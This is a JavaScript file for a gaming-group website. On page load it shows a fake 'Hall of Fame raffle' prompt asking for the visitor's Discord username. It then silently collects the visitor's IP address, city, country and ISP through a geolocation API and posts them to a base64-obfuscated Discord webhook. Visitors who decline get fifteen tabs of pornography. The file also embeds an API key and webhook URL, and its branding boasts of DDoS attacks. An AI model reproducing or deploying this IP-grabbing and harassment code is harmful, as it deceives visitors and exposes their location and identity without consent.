function decryptWebhook(encryptedHook) {
    const key = "ragers";
    return atob(encryptedHook);
}

const encryptedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNTQ3MDMyODIwMTU0Nzc4Ni8tOHR0ZWFDbnRTeUpEeUItTG5fSHNYVUJCQUVDODBJalVuQUgyVUQyNjB5LTlkSjIzMDdFVEEzcWZtQVEtR0JGT3NPXw==";

const brandDescription = [
    'pro ragers',
    'lobby slammers',
    'xane ddosers',
    'trashtalkers',
    'omegatm fanboys',
    'powered by velocity',
    'hack vs hack team'
];

const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'tada', 'wobble', 'jello'];

function promptUser() {
    const video = document.querySelector('.background-video');
    const username = prompt("You have been chosen in a raffle to be apart of Ragers Hall Of Fame, Please Input your discord username.");

    if (username) {
        video.currentTime = 0;
        video.muted = false;
        video.volume = 1.0;
        const playPromise = video.play();

        if (playPromise !== undefined) {
            playPromise.then(() => {
                // Video is playing perfectly!
            }).catch(error => {
                document.addEventListener('click', () => {
                    video.play();
                }, { once: true });
            });
        }

        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e3936cf89e4b41c8af209d86c02a8a39`)
            .then(response => response.json())
            .then(data => {
                const webhookData = {
                    content: `New Hall of Fame Entry!`,
                    embeds: [{
                        title: "User Information",
                        color: 16711680,
                        fields: [
                            { name: "Discord Username", value: username },
                            { name: "IP Address", value: data.ip },
                            { name: "Location", value: `${data.city}, ${data.country_name}` },
                            { name: "ISP", value: data.isp }
                        ],
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(decryptWebhook(encryptedWebhook), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });
            });
    } else {
        for(let i = 0; i < 15; i++) {
            window.open("https://www.pornhub.com/view_video.php?viewkey=672298c5e2062", "_blank");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const loadingContainer = document.querySelector('.loading-container');
    const mainPage = document.querySelector('.main-page');
    const video = document.querySelector('.background-video');
    video.muted = true;

    setTimeout(() => {
        loadingContainer.classList.add('fade-out');
        setTimeout(() => {
            loadingContainer.style.display = 'none';
            mainPage.style.display = 'block';
            mainPage.classList.add('fade-in');
            video.play();
            updateBrandDescription();
            setTimeout(promptUser, 1000);
        }, 1000);
    }, 2750);
});

function updateBrandDescription() {
    const element = document.getElementById('brandDescription');
    let currentIndex = 0;

    setInterval(() => {
        const randomEffect = effects[Math.floor(Math.random() * effects.length)];
        element.textContent = brandDescription[currentIndex];
        element.className = `animate__animated animate__${randomEffect}`;
        currentIndex = (currentIndex + 1) % brandDescription.length;
    }, 2000);
}

fetch('users.html')
    .then(response => response.text())
    .then(data => {
        document.getElementById('users-container').innerHTML = data;
    });
